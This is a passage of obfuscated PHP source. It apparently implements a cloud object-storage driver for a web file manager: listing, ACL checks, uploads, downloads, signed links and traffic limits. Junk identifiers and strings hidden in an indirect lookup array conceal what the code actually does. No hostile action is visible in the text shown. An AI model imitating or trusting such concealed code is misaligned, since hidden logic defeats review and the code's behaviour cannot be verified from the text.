trim($ş¯µ³ñø[$ŸˆÔ°õî[1506]], $ŸˆÔ°õî[121]); } if (isset($ş¯µ³ñø[$ŸˆÔ°õî[79]])) { $İĞÆ˜ñ[$ŸˆÔ°õî[79]] = $ş¯µ³ñø[$ŸˆÔ°õî[79]]; } if (isset($ş¯µ³ñø[$ŸˆÔ°õî[88]])) { $İĞÆ˜ñ[$ŸˆÔ°õî[88]] = $ş¯µ³ñø[$ŸˆÔ°õî[88]]; } if (isset($ş¯µ³ñø[$ŸˆÔ°õî[207]]) && !trim($İĞÆ˜ñ[$ŸˆÔ°õî[88]])) { $İĞÆ˜ñ[$ŸˆÔ°õî[88]] = $ş¯µ³ñø[$ŸˆÔ°õî[207]]; } return $İĞÆ˜ñ; } private function folderInfo($ßÅ­ô¿Õ, $«‘‚ûó¶ = false, $à§æ¾Âì = array()) { $µŠø–Ú =& $_SERVER[É¨™èà]; $ö¢ØÜÏ = array($µŠø–Ú[32] => $this->pathThis($ßÅ­ô¿Õ), $µŠø–Ú[87] => $this->getPathOuter($µŠø–Ú[8] . $ßÅ­ô¿Õ), $µŠø–Ú[33] => $µŠø–Ú[78]); if ($«‘‚ûó¶) { return $ö¢ØÜÏ; } $ö¢ØÜÏ[$µŠø–Ú[234]] = $ö¢ØÜÏ[$µŠø–Ú[88]] = 0; $ö¢ØÜÏ[$µŠø–Ú[235]] = $ö¢ØÜÏ[$µŠø–Ú[236]] = !0; if (empty($à§æ¾Âì)) { $ßÅ­ô¿Õ = rtrim($ßÅ­ô¿Õ, $µŠø–Ú[8]) . $µŠø–Ú[8]; $ï¾÷Ö„ = $this->objectMeta($ßÅ­ô¿Õ); if (!$ï¾÷Ö„) { return $ö¢ØÜÏ; } $à§æ¾Âì = array($µŠø–Ú[234] => $ï¾÷Ö„[$µŠø–Ú[587]][$µŠø–Ú[1511]], $µŠø–Ú[88] => strtotime($ï¾÷Ö„[$µŠø–Ú[1508]])); } if (isset($à§æ¾Âì[$µŠø–Ú[88]])) { $ö¢ØÜÏ[$µŠø–Ú[88]] = $à§æ¾Âì[$µŠø–Ú[88]]; } if (isset($à§æ¾Âì[$µŠø–Ú[234]])) { $ö¢ØÜÏ[$µŠø–Ú[234]] = $à§æ¾Âì[$µŠø–Ú[234]]; } return $ö¢ØÜÏ; } public function listPath($Ì¼Ô˜Ğï, $Ë§¼Áµâ = false) { $ƒÅà¡ä§ =& $_SERVER[É¨™èà]; $„üğ„šÓ = $this->fileList($Ì¼Ô˜Ğï, $ƒÅà¡ä§[8], !0); foreach ($„üğ„šÓ[$ƒÅà¡ä§[85]] as $õÖŠªµ› => $ÍÔÒû¬) { $„üğ„šÓ[$ƒÅà¡ä§[85]][$õÖŠªµ›] = $this->folderInfo($ÍÔÒû¬, $Ë§¼Áµâ, $ÍÔÒû¬); } foreach ($„üğ„šÓ[$ƒÅà¡ä§[86]] as $õÖŠªµ› => $ÍÔÒû¬) { $„üğ„šÓ[$ƒÅà¡ä§[86]][$õÖŠªµ›] = $this->fileInfo($ÍÔÒû¬[$ƒÅà¡ä§[32]], $Ë§¼Áµâ, $ÍÔÒû¬); } return $„üğ„šÓ; } protected function infoChildren($¡ÕåÔĞ, &$ˆ¤£°ë€) { $š–œ÷œş =& $_SERVER[É¨™èà]; $÷“şØè  = $this->fileList($¡ÕåÔĞ, $š–œ÷œş[12], !0); $ˆ¤£°ë€[$š–œ÷œş[81]] += count($÷“şØè [$š–œ÷œş[85]]); $ˆ¤£°ë€[$š–œ÷œş[80]] += count($÷“şØè [$š–œ÷œş[86]]); foreach ($÷“şØè [$š–œ÷œş[86]] as $É¦úÜ‰Ï) { if (!$É¦úÜ‰Ï || !$É¦úÜ‰Ï[$š–œ÷œş[79]]) { continue; } $ˆ¤£°ë€[$š–œ÷œş[79]] += $É¦úÜ‰Ï[$š–œ÷œş[79]]; } } public function has($¸†Ä¨œ“, $†¯ÓÁò  = false, $µÛ¬ƒŠ = true) { $îÏõ‚Ğœ =& $_SERVER[É¨™èà]; $¸†Ä¨œ“ = trim($¸†Ä¨œ“, $îÏõ‚Ğœ[8]); $Ñº‰”™ = empty($¸†Ä¨œ“) && $¸†Ä¨œ“ !== $îÏõ‚Ğœ[231] ? $îÏõ‚Ğœ[12] : $¸†Ä¨œ“ . $îÏõ‚Ğœ[8]; $Şìı„£² = $îÏõ‚Ğœ[12]; $öÛ“ø = 500; $ÈÔá££ñ = $ëæ¬ÓÕĞ = 0; while (!0) { check_abort(); $ãÉˆ¯„ = array($îÏõ‚Ğœ[1502] => $îÏõ‚Ğœ[8], $îÏõ‚Ğœ[1503] => $Ñº‰”™, $îÏõ‚Ğœ[1504] => $öÛ“ø, $îÏõ‚Ğœ[1505] => $Şìı„£²); try { $İÀ«¢Ş’ = $this->client->listObjects($this->bucket, $ãÉˆ¯„); } catch (OSS\Core\OssException $ÁšÀÆµ‹) { $this->writeLog(__FUNCTION__ . $îÏõ‚Ğœ[215] . $ÁšÀÆµ‹->getMessage()); break; } $Şìı„£² = $İÀ«¢Ş’->getNextMarker(); $õóşÖ× = $İÀ«¢Ş’->getObjectList(); $‡µİ¬€î = $İÀ«¢Ş’->getPrefixList(); if ($†¯ÓÁò ) { if (count($õóşÖ×) > 1 || count($õóşÖ×) == 1 && $õóşÖ×[0]->getKey() != $Ñº‰”™) { $ÈÔá££ñ += count($õóşÖ×) - 1; } if (!empty($‡µİ¬€î)) { $ëæ¬ÓÕĞ += count($‡µİ¬€î); } if ($Şìı„£² === $îÏõ‚Ğœ[12]) { break; } continue; } if ($µÛ¬ƒŠ) { if (!empty($õóşÖ×)) { if (count($õóşÖ×) > 1 || $õóşÖ×[0]->getKey() != $Ñº‰”™) { return !0; } } } else { if (!empty($‡µİ¬€î)) { return !0; } } if ($Şìı„£² === $îÏõ‚Ğœ[12]) { break; } } if ($†¯ÓÁò ) { return array($îÏõ‚Ğœ[242] => $ÈÔá££ñ, $îÏõ‚Ğœ[243] => $ëæ¬ÓÕĞ); } return !1; } public function listAll($€õë€ã¥) { $½ùç¯µÌ =& $_SERVER[É¨™èà]; $¢Úå¦ŒÌ = $this->fileList($€õë€ã¥, $½ùç¯µÌ[12], !0); $„„ü¦› = array_to_keyvalue($¢Úå¦ŒÌ[$½ùç¯µÌ[86]], $½ùç¯µÌ[32]); foreach ($¢Úå¦ŒÌ[$½ùç¯µÌ[85]] as $™Ê˜õ™‘) { if (is_string($™Ê˜õ™‘)) { $„„ü¦›[$™Ê˜õ™‘] = array($½ùç¯µÌ[79] => 0); } } return $this->listAllFiles($€õë€ã¥, $„„ü¦›); } public function canRead($Ÿœ¡¢„Ì) { $™´‰›Úé =& $_SERVER[É¨™èà]; $üŠ·®…ô = $this->pathAcl($Ÿœ¡¢„Ì); return $üŠ·®…ô == $™´‰›Úé[1512] || $üŠ·®…ô == $™´‰›Úé[634] ? !0 : !1; } public function canWrite($„‡Ê¨ĞÓ) { $¡ãÒÒƒ— = $this->pathAcl($„‡Ê¨ĞÓ); return $¡ãÒÒƒ— == $_SERVER[É¨™èà][634] ? !0 : !1; } public function pathAcl($¦±Ç¿§) { $“ßâÖşû =& $_SERVER[É¨™èà]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÜÚÈÁ¯˜ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¦±Ç¿§)); } catch (OSS\Core\OssException $İ‘œÖ›) { $this->writeLog(__FUNCTION__ . $“ßâÖşû[215] . $İ‘œÖ›->getMessage()); return !1; } $‹¦»×Ùº = $ÜÚÈÁ¯˜ == $“ßâÖşû[37] ? $this->bucketAcl : $ÜÚÈÁ¯˜; if ($‹¦»×Ùº == $“ßâÖşû[1513]) { return $“ßâÖşû[1512]; } if ($‹¦»×Ùº == $“ßâÖşû[1514]) { return $“ßâÖşû[634]; } return $‹¦»×Ùº; } private function chmodPath($°“§²Šˆ, $ĞíÕÉşÚ = '') { $­ãã¼‰ =& $_SERVER[É¨™èà]; $Û®³¯Ú = empty($ĞíÕÉşÚ) ? $­ãã¼‰[1514] : $ĞíÕÉşÚ; $èéñã£ = array($­ãã¼‰[37], $­ãã¼‰[232], $­ãã¼‰[1513], $­ãã¼‰[1514]); if (!in_array($Û®³¯Ú, $èéñã£)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($°“§²Šˆ), $Û®³¯Ú); } catch (OSS\Core\OssException $¥¿£²¹›) { $this->writeLog(__FUNCTION__ . $­ãã¼‰[215] . $¥¿£²¹›->getMessage()); return !1; } return !0; } public function getContent($Ş•ºñ‰ë) { return $this->fileSubstr($Ş•ºñ‰ë, -1); } public function setContent($ìÉ¿–Ä, $£À–ÈÒù = '') { $—ó¤ŠÙˆ =& $_SERVER[É¨™èà]; try { $ÒÖı¹° = $this->trafficLimit($—ó¤ŠÙˆ[1515]); $“ì•ßÂ = $this->client->putObject($this->bucket, $this->pathEncode($ìÉ¿–Ä), $£À–ÈÒù, $ÒÖı¹°); } catch (OSS\Core\OssException $Œ§¼©–İ) { $this->writeLog(__FUNCTION__ . $—ó¤ŠÙˆ[215] . $Œ§¼©–İ->getMessage()); return !1; } $–Ìúé¶ = array($—ó¤ŠÙˆ[1509] => trim($“ì•ßÂ[$—ó¤ŠÙˆ[1506]], $—ó¤ŠÙˆ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ìÉ¿–Ä))); $this->updateObjMeta($ìÉ¿–Ä, $–Ìúé¶); return isset($“ì•ßÂ[$—ó¤ŠÙˆ[1516]][$—ó¤ŠÙˆ[297]]) ? !0 : !1; } private function updateObjMeta($»ö÷ÅÁ™, $ÂÄİÂ¯Õ) { $»ö÷ÅÁ™ = $this->pathEncode($»ö÷ÅÁ™); try { $Éã›‡ï = array(OSS\OssClient::OSS_HEADERS => $ÂÄİÂ¯Õ); $this->client->copyObject($this->bucket, $»ö÷ÅÁ™, $this->bucket, $»ö÷ÅÁ™, $Éã›‡ï); } catch (OSS\Core\OssException $ÑğŸÉÄ) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][215] . $ÑğŸÉÄ->getMessage()); return !1; } return !0; } public function upload($ŒŠ¬¡‚Œ, $®ä€¼ú”, $€ˆ­¥Æİ = false, $…é¹€£ = REPEAT_REPLACE) { $ş¿¸¹¸ú =& $_SERVER[É¨™èà]; $è’Ñ¡¥¹ = trim($ŒŠ¬¡‚Œ, $ş¿¸¹¸ú[8]); $ÏŒÍ•Á± = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ş¿¸¹¸ú[1509] => @md5_file($®ä€¼ú”)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ŒŠ¬¡‚Œ))); $ÏŒÍ•Á± = $this->trafficLimit($ş¿¸¹¸ú[1515], $ÏŒÍ•Á±); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($è’Ñ¡¥¹), $®ä€¼ú”, $ÏŒÍ•Á±); } catch (OSS\Core\OssException $íê‘­²€) { $this->writeLog(__FUNCTION__ . $ş¿¸¹¸ú[215] . $íê‘­²€->getMessage()); return !1; } return $this->getPathOuter($ŒŠ¬¡‚Œ); } public function getHost() { $­ï ßÉ =& $_SERVER[É¨™èà]; $‘¸¹ËúÑ = explode($­ï ßÉ[211], parent::getHost()); return $‘¸¹ËúÑ[0] . $­ï ßÉ[211] . $this->bucket . $­ï ßÉ[10] . $‘¸¹ËúÑ[1]; } public function uploadFormData($›™ìûê, $şÂ©Ó = 3600) { $«‹‚ûˆø =& $_SERVER[É¨™èà]; if (!($“—¸° = $this->getHost())) { return !1; } $É¢İäÈ = $şÂ©Ó; $ç‰ƒİ§Ò = date($«‹‚ûˆø[1517], time() + $É¢İäÈ); $äÌ‰ƒ‘Ó = new DateTime($ç‰ƒİ§Ò); $³‡¢ÑÙØ = $äÌ‰ƒ‘Ó->format(DateTime::ISO8601); $¹ì²×Àç = strpos($³‡¢ÑÙØ, $«‹‚ûˆø[382]); $³‡¢ÑÙØ = substr($³‡¢ÑÙØ, 0, $¹ì²×Àç) . $«‹‚ûˆø[1518]; $ÑÅÍ‰ê­ = 1048576000 * 5; $ºĞ“ÂùË = $this->pathFather($›™ìûê); $™Šû©¹¼ = array($«‹‚ûˆø[265] => $³‡¢ÑÙØ, $«‹‚ûˆø[268] => array(array($«‹‚ûˆø[1519], 0, $ÑÅÍ‰ê­), array($«‹‚ûˆø[270], $«‹‚ûˆø[271], $ºĞ“ÂùË))); $ˆƒ†Ê° = base64_encode(json_encode($™Šû©¹¼)); $…’Ããó = base64_encode(hash_hmac($«‹‚ûˆø[1439], $ˆƒ†Ê°, $this->secret, !0)); $Ååı¢ğ = array($«‹‚ûˆø[1520] => $this->accessKey, $«‹‚ûˆø[280] => $ˆƒ†Ê°, $«‹‚ûˆø[273] => $«‹‚ûˆø[264], $«‹‚ûˆø[1521] => $…’Ããó, $«‹‚ûˆø[209] => $“—¸°); $Ååı¢ğ = $this->trafficLimit($«‹‚ûˆø[1515], $Ååı¢ğ, !0); return $Ååı¢ğ; } public function uploadMultiData($©Õ¼ìÕ, $¨® ÇÜ¿ = 3600) { $Ù É¦€° =& $_SERVER[É¨™èà]; if (!($®Ô¹Ùêß = $this->getHost())) { return !1; } $¿Î­²×… = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($©Õ¼ìÕ)); return array($Ù É¦€°[284] => $¿Î­²×…, $Ù É¦€°[209] => $®Ô¹Ùêß . $Ù É¦€°[8] . $this->pathEncode($©Õ¼ìÕ), $Ù É¦€°[285] => gmdate($Ù É¦€°[1522]), $Ù É¦€°[97] => $©Õ¼ìÕ); } public function uploadMultiAuth($³İÓ », $„â²âå§ = array()) { if (isset($„â²âå§[$_SERVER[É¨™èà][286]])) { return $this->uploadPartAuth($³İÓ », $„â²âå§); } return $this->uploadListAuth($³İÓ », $„â²âå§); } private function uploadPartAuth($™®àï¢â, $æ÷İºÃö = array()) { $ß‰ĞÕ‘Ñ =& $_SERVER[É¨™èà]; $íş›Íå¯ = $æ÷İºÃö[$ß‰ĞÕ‘Ñ[97]]; $ôëš‡²– = $this->_getUploadAuth($íş›Íå¯, $æ÷İºÃö); $²ÊÄ­å‰ = array($ß‰ĞÕ‘Ñ[289] => $ôëš‡²–[$ß‰ĞÕ‘Ñ[289]], $ß‰ĞÕ‘Ñ[285] => $ôëš‡²–[$ß‰ĞÕ‘Ñ[285]]); if (isset($ôëš‡²–[$ß‰ĞÕ‘Ñ[1523]])) { $²ÊÄ­å‰[$ß‰ĞÕ‘Ñ[1523]] = $ôëš‡²–[$ß‰ĞÕ‘Ñ[1523]]; } return $²ÊÄ­å‰; } private function uploadListAuth($¼ÉùŞ¥™, $•‹½Ğ²³ = array()) { $ä‹‘ù¹ç =& $_SERVER[É¨™èà]; $ÃÃûë­÷ = $•‹½Ğ²³[$ä‹‘ù¹ç[97]]; $çã†ˆ•¿ = $•‹½Ğ²³[$ä‹‘ù¹ç[284]]; $±¿Ê¥İÙ = $this->client->listParts($this->bucket, $this->pathEncode($ÃÃûë­÷), $çã†ˆ•¿); $À›è¢ç = $±¿Ê¥İÙ->getListPart(); $éé”ëŒ­ = array(); foreach ($À›è¢ç as $Ñ›©Œ±×) { $éé”ëŒ­[] = array($ä‹‘ù¹ç[300] => $Ñ›©Œ±×->getPartNumber(), $ä‹‘ù¹ç[301] => trim($Ñ›©Œ±×->getETag(), $ä‹‘ù¹ç[121])); } if (!$éé”ëŒ­) { return !1; } $³ËÚó·‡ = $this->_getUploadAuth($ÃÃûë­÷, $•‹½Ğ²³); return array($ä‹‘ù¹ç[289] => $³ËÚó·‡[$ä‹‘ù¹ç[289]], $ä‹‘ù¹ç[285] => $³ËÚó·‡[$ä‹‘ù¹ç[285]], $ä‹‘ù¹ç[292] => $éé”ëŒ­); } private function _getUploadAuth($Şš“Ê½, $¬¢ı“ƒæ) { $ïØÔì–Ü =& $_SERVER[É¨™èà]; $¾ÏÈ›İ = gmdate($ïØÔì–Ü[1522]); $°Å¥‚”ø = isset($¬¢ı“ƒæ[$ïØÔì–Ü[286]]) ? $ïØÔì–Ü[256] : $ïØÔì–Ü[291]; $€èêÛôØ = array_intersect_key($¬¢ı“ƒæ, array_flip(array($ïØÔì–Ü[286], $ïØÔì–Ü[284]))); ksort($€èêÛôØ); $¦õ˜ı™ö = $€èêÛôØ ? $ïØÔì–Ü[76] . http_build_query($€èêÛôØ, null, $ïØÔì–Ü[287], PHP_QUERY_RFC3986) : $ïØÔì–Ü[12]; $ØÛ®ó™õ = array($°Å¥‚”ø, $ïØÔì–Ü[12], $ïØÔì–Ü[123], $¾ÏÈ›İ, "\x78\x2d\x6f\163\163\x2d\144\x61\164\145\72{$¾ÏÈ›İ}", $ïØÔì–Ü[8] . $this->bucket . $ïØÔì–Ü[8] . $Şš“Ê½ . $¦õ˜ı™ö); if (isset($¬¢ı“ƒæ[$ïØÔì–Ü[286]])) { $ä§šç«ö = $this->trafficLimit($ïØÔì–Ü[1515], array(), !0); if ($ä§šç«ö) { $Şš“Ê½ = $ïØÔì–Ü[1523]; array_splice($ØÛ®ó™õ, 5, 0, $Şš“Ê½ . $ïØÔì–Ü[4] . $ä§šç«ö[$Şš“Ê½]); } } $ ‘âÖ·› = implode($ïØÔì–Ü[288], $ØÛ®ó™õ); $¶²ÉÓÀ€ = base64_encode(hash_hmac($ïØÔì–Ü[1439], $ ‘âÖ·›, $this->secret, !0)); $‰üÄò¡ˆ = $ïØÔì–Ü[1492] . $this->accessKey . $ïØÔì–Ü[4] . $¶²ÉÓÀ€; $×â¡‡®Ó = array($ïØÔì–Ü[289] => $‰üÄò¡ˆ, $ïØÔì–Ü[285] => $¾ÏÈ›İ); if (!empty($ä§šç«ö)) { $×â¡‡®Ó = array_merge($×â¡‡®Ó, $ä§šç«ö); } return $×â¡‡®Ó; } public function download($¡üÕÉŸÊ, $·Ş»œÆÏ) { $Ö£ÛƒßÚ =& $_SERVER[É¨™èà]; if ($this->isFolder($¡üÕÉŸÊ)) { return !1; } try { $òÀîßŸ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $·Ş»œÆÏ); $òÀîßŸ = $this->trafficLimit($Ö£ÛƒßÚ[112], $òÀîßŸ); $this->client->getObject($this->bucket, $this->pathEncode($¡üÕÉŸÊ), $òÀîßŸ); } catch (OSS\Core\OssException $¾‡ÜñĞ) { $this->writeLog(__FUNCTION__ . $Ö£ÛƒßÚ[215] . $¾‡ÜñĞ->getMessage()); return !1; } return $·Ş»œÆÏ; } public function fileSubstr($ÁÅæÙ¡õ, $Ôïçã± = 0, $Ó¡â‘ºÄ = false) { if ($Ôïçã± === -1) { $™ç–šî = array(); } else { if ($Ó¡â‘ºÄ === !1) { $êÃªÇÎ = $this->size($ÁÅæÙ¡õ); } else { $êÃªÇÎ = $Ôïçã± + $Ó¡â‘ºÄ - 1; } $™ç–šî = array(OSS\OssClient::OSS_RANGE => "{$Ôïçã±}\55{$êÃªÇÎ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÁÅæÙ¡õ), $™ç–šî); } catch (OSS\Core\OssException $«¯Á‘‡) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][215] . $«¯Á‘‡->getMessage()); think_exception($«¯Á‘‡->getMessage()); return !1; } } private function trafficLimit($ĞÃ„‡›, $çÅ§ìŸ = array(), $Ÿ²ÑÈ‚ = false) { $‹Ùø‡²¿ =& $_SERVER[É¨™èà]; if ($ĞÃ„‡› == $‹Ùø‡²¿[1515] && $this->isUploadServer() || $ĞÃ„‡› == $‹Ùø‡²¿[112] && $this->isFileOutServer()) { return $çÅ§ìŸ; } $Èà‡²¼ñ = floatval($GLOBALS[$‹Ùø‡²¿[6]][$‹Ùø‡²¿[92]][$‹Ùø‡²¿[110]][$ĞÃ„‡›]) * 1024 * 1024 * 8; if (!$Èà‡²¼ñ) { return $çÅ§ìŸ; } $Èà‡²¼ñ = $Èà‡²¼ñ < 819200 ? 819200 : ($Èà‡²¼ñ > 838860800 ? 838860800 : $Èà‡²¼ñ); if ($Ÿ²ÑÈ‚) { $çÅ§ìŸ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Èà‡²¼ñ); } else { if (!isset($çÅ§ìŸ[OSS\OssClient::OSS_HEADERS])) { $çÅ§ìŸ[OSS\OssClient::OSS_HEADERS] = array(); } $çÅ§ìŸ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Èà‡²¼ñ); } return $çÅ§ìŸ; } public function link($ò‰şåß, $î×ƒ‚¯Ó = array()) { $òÔê™œœ =& $_SERVER[É¨™èà]; if (!$this->exist($ò‰şåß) || $this->isFolder($ò‰şåß)) { return !1; } try { $î×ƒ‚¯Ó = $this->trafficLimit($òÔê™œœ[112], $î×ƒ‚¯Ó, !0); $¨”›ë† = $this->client->signUrl($this->bucket, $this->pathEncode($ò‰şåß), 3600 * 12, $òÔê™œœ[1524], $î×ƒ‚¯Ó); return $this->getCdnLink($¨”›ë†); } catch (OSS\Core\OssException $¬äúü‰²) { $this->writeLog(__FUNCTION__ . $òÔê™œœ[215] . $¬äúü‰²->getMessage()); return !1; } } public function fileOut($÷½¼ï•‘, $œ¡ä³˜ = false, $í¤ß‡î = false, $úµ¹Ğˆò = '') { $ò¼ç€Šè =& $_SERVER[É¨™èà]; if ($this->isFileOutServer()) { return $this->fileOutServer($÷½¼ï•‘, $œ¡ä³˜, $í¤ß‡î, $úµ¹Ğˆò); } if (!$í¤ß‡î) { $í¤ß‡î = $this->pathThis($÷½¼ï•‘); } $í¤ß‡î = rawurlencode($í¤ß‡î); $İùÄŸğæ = get_file_mime(get_path_ext($í¤ß‡î)); if ($İùÄŸğæ == $ò¼ç€Šè[251]) { return parent::fileOut($÷½¼ï•‘, $œ¡ä³˜, $í¤ß‡î, $úµ¹Ğˆò); } $œ¡ä³˜ = $œ¡ä³˜ ? $ò¼ç€Šè[1525] : $ò¼ç€Šè[1526]; $ÇÁÄõ¦ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ò¼ç€Šè[1527] . rawurlencode("{$œ¡ä³˜}\73\x66\151\x6c\x65\156\141\155\145\75{$í¤ß‡î}")); $êúƒĞ‹é = $this->link($÷½¼ï•‘, $ÇÁÄõ¦); $this->fileOutLink($êúƒĞ‹é); } public function fileOutServer($ƒÜ„´®», $ˆ¯ı©ãõ = false, $ä•­ı±§ = false, $„»¨ğó¡ = '') { parent::fileOut($ƒÜ„´®», $ˆ¯ı©ãõ, $ä•­ı±§, $„»¨ğó¡); } public function fileOutImage($ÏÂí‰‰¯, $Õœ¦ª‘Ô = 250) { if ($this->size($ÏÂí‰‰¯) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÏÂí‰‰¯, $Õœ¦ª‘Ô); } $ÆïÊ¹š» = array(OSS\OssClient::OSS_PROCESS => $_SERVER[É¨™èà][1489] . $Õœ¦ª‘Ô); $â·Íûøü = $this->link($ÏÂí‰‰¯, $ÆïÊ¹š»); $this->fileOutLink($â·Íûøü); } public function fileOutImageServer($»™ÊÏú™, $ÖˆÙª‘ = 250) { parent::fileOutImage($»™ÊÏú™, $ÖˆÙª‘); } public function fileOutLink($¢¿´õ©) { $ú¹â—áà =& $_SERVER[É¨™èà]; if (!$this->isCdnHost() && substr($¢¿´õ©, 0, 7) == $ú¹â—áà[219]) { $¢¿´õ© = $ú¹â—áà[220] . substr($¢¿´õ©, 7); } header($ú¹â—áà[175] . $¢¿´õ©); die; } public function hashMd5($°öÖƒ›æ, $¬¨˜ÇÜŞ = '') { $—†²¦öî =& $_SERVER[É¨™èà]; $ãêØ¿øÖ = $this->_objectMeta($°öÖƒ›æ); if (!$ãêØ¿øÖ) { return $—†²¦öî[12]; } if (!isset($ãêØ¿øÖ[$—†²¦öî[1509]]) && !empty($¬¨˜ÇÜŞ)) { $™§İ§û¹ = $this->updateObjMeta($°öÖƒ›æ, array($—†²¦öî[1509] => $¬¨˜ÇÜŞ)); $ãêØ¿øÖ[$—†²¦öî[1509]] = $™§İ§û¹ ? $¬¨˜ÇÜŞ : $—†²¦öî[12]; } return isset($ãêØ¿øÖ[$—†²¦öî[1509]]) ? strtolower($ãêØ¿øÖ[$—†²¦öî[1509]]) : $—†²¦öî[12]; } public function size($İ¾Å±º) { $•‡¡á÷ú = $this->objectMeta($İ¾Å±º); return $•‡¡á÷ú ? $•‡¡á÷ú[$_SERVER[É¨™èà][79]] : 0; } public function info($¦å­ë–) { if ($this->isFolder($¦å­ë–)) { return $this->folderInfo($¦å­ë–); } else { if ($this->isFile($¦å­ë–)) { return $this->fileInfo($¦å­ë–); } } return !1; } public function exist($‡Ğ¬şéÕ) { return $this->isFile($‡Ğ¬şéÕ) || $this->isFolder($‡Ğ¬şéÕ); } public function isFile($—ºÌ®š„) { return !$this->isFolder($—ºÌ®š„) && $this->objectMeta($—ºÌ®š„); } public function isFolder($“§¯Ô›Å) { return $this->cacheMethod($_SERVER[É¨™èà][180], $“§¯Ô›Å); } protected function objectMeta($¦Å×™Ø±) { return $this->cacheMethod($_SERVER[É¨™èà][182], $¦Å×™Ø±); } protected function _objectMeta($óÄ¿Í°í) { $ü½——´Ò =& $_SERVER[É¨™èà]; try { $áˆºëüê = $this->client->getObjectMeta($this->bucket, $this->pathEncode($óÄ¿Í°í)); } catch (OSS\Core\OssException $½ã¬õ€ı) { $this->writeLog(__FUNCTION__ . $ü½——´Ò[215] . $½ã¬õ€ı->getMessage()); $áˆºëüê = !1; } if ($áˆºëüê) { $áˆºëüê[$ü½——´Ò[79]] = intval($áˆºëüê[$ü½——´Ò[1507]]); } return $áˆºëüê; } protected function _isFolder($ŒÓº¯‘“) { $´ÆÒ”Åæ =& $_SERVER[É¨™èà]; if ($ŒÓº¯‘“ == $´ÆÒ”Åæ[12] || $ŒÓº¯‘“ == $´ÆÒ”Åæ[8]) { return !0; } $Î€Œø³Ä = array($´ÆÒ”Åæ[1502] => $´ÆÒ”Åæ[8], $´ÆÒ”Åæ[1503] => rtrim($ŒÓº¯‘“, $´ÆÒ”Åæ[8]) . $´ÆÒ”Åæ[8], $´ÆÒ”Åæ[1504] => 1, $´ÆÒ”Åæ[1505] => $´ÆÒ”Åæ[12]); $Öğ€Ûà’ = $this->client->listObjects($this->bucket, $Î€Œø³Ä); if ($Öğ€Ûà’->getObjectList() || $Öğ€Ûà’->getPrefixList()) { return !0; } return !1; } public function writeLog($ÑÉ­íØÜ = '', $çƒ–ÖÏ = false) { $ÁÆ©ê‡ =& $_SERVER[É¨™èà]; $ƒ·Ì´î = in_array(ACTION, array($ÁÆ©ê‡[213], $ÁÆ©ê‡[214])); if (!$ƒ·Ì´î && !GLOBAL_DEBUG) { return; } $·óó‚ôô = 0; if (stripos($ÑÉ­íØÜ, $ÁÆ©ê‡[1528]) !== !1) { $·óó‚ôô = 1; $üãÑµ’Ê = explode($ÁÆ©ê‡[1529], $ÑÉ­íØÜ); $ÑÉ­íØÜ = !empty($üãÑµ’Ê[1]) ? $üãÑµ’Ê[1] : $ÑÉ­íØÜ; } else { if (stripos($ÑÉ­íØÜ, $ÁÆ©ê‡[1530])) { $·óó‚ôô = 2; $üãÑµ’Ê = explode($ÁÆ©ê‡[1530], $ÑÉ­íØÜ); $üãÑµ’Ê = explode($ÁÆ©ê‡[4], $üãÑµ’Ê[0]); $ÑÉ­íØÜ = !empty($üãÑµ’Ê[1]) ? $üãÑµ’Ê[1] : $ÑÉ­íØÜ; } } if ($ƒ·Ì´î && I18n::getType() == $ÁÆ©ê‡[1531]) { if ($·óó‚ôô == 1) { $ÑÉ­íØÜ = str_replace($ÁÆ©ê‡[1532], $ÁÆ©ê‡[1533], $ÑÉ­íØÜ); } else { if ($·óó‚ôô == 2) { $üãÑµ’Ê = explode($ÁÆ©ê‡[215], $üãÑµ’Ê[0]); $ÊòŒÚÅ = isset($üãÑµ’Ê[1]) ? $üãÑµ’Ê[1] : $ÁÆ©ê‡[12]; $óùãĞù÷ = array($ÁÆ©ê‡[1534] => $ÁÆ©ê‡[1535], $ÁÆ©ê‡[1536] => $ÁÆ©ê‡[1537], $ÁÆ©ê‡[1538] => $ÁÆ©ê‡[1539], $ÁÆ©ê‡[1540] => $ÁÆ©ê‡[1541], $ÁÆ©ê‡[1542] => $ÁÆ©ê‡[1543], $ÁÆ©ê‡[1544] => $ÁÆ©ê‡[1545], $ÁÆ©ê‡[1546] => $ÁÆ©ê‡[1547], $ÁÆ©ê‡[1548] => $ÁÆ©ê‡[1549], $ÁÆ©ê‡[1550] => $ÁÆ©ê‡[1551], $ÁÆ©ê‡[1552] => $ÁÆ©ê‡[1553]); if (isset($óùãĞù÷[$ÊòŒÚÅ])) { $ÑÉ­íØÜ = $óùãĞù÷[$ÊòŒÚÅ]; } } } if (stripos($ÑÉ­íØÜ, $ÁÆ©ê‡[1554])) { $ÑÉ­íØÜ = $ÁÆ©ê‡[1555]; } } if (!trim($ÑÉ­íØÜ)) { return; } parent::writeLog(trim($ÑÉ­íØÜ), $çƒ–ÖÏ); } } goto b•æÚ²Âåõ; B„³‹ˆùõÄ: class TaskHttp extends Task { protected function startAfter() { $¿â“œ¤Ó =& $_SERVER[É¨™èà]; $ÉÅ…ùéĞ =& $this->task; $ÉÅ…ùéĞ[$¿â“œ¤Ó[1878]] = 1; Hook::bind($¿â“œ¤Ó[1846], array($this, $¿â“œ¤Ó[1879])); Hook::bind($¿â“œ¤Ó[1848], array($this, $¿â“œ¤Ó[1880])); Hook::bind($¿â“œ¤Ó[1850], array($this, $¿â“œ¤Ó[1881])); } protected function endAfter() { $•ıÁÃü— 